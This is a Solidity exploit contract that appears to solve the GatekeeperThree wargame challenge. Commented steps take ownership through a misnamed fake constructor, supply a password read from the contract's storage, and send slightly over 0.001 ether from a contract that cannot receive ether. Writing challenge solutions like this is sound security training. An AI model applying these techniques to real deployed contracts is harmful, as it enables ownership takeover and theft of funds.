// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r()external;
    function createTrick()external;
    function getAllowance(uint)external;
    function enter()external;

}

contract Attack{
    IGatekeeperThree gate;
    constructor( IGatekeeperThree _gate){
      gate= _gate;
      gate.createTrick();
    }
    function attack(uint password)external payable{
        /*
        *gateOne
        *calling fake constructor to get ownership
        *and calling function enter() from another contract should solve this gate
        */
        gate.construct0r();
        /*
        *gateTwo
        *readig the value of state variable password (1709935944) from contract SimpleTrick
        *i've read it from etherscan (in STATE section), but it could be read from 
        *using web3.eth.getStorageAt("contract we want to read from", slot in memory)
        */
        gate.getAllowance(password);
       /*
        *gateThree
        *should be solved by sending more than 0.001ether
        *and not having fallback/receive function to receive ether
        */
        address(gate).call{value: 1000000000000001 wei}("");
        gate.enter();
    }

    //there is no fallback/receive function to receive ether
    
}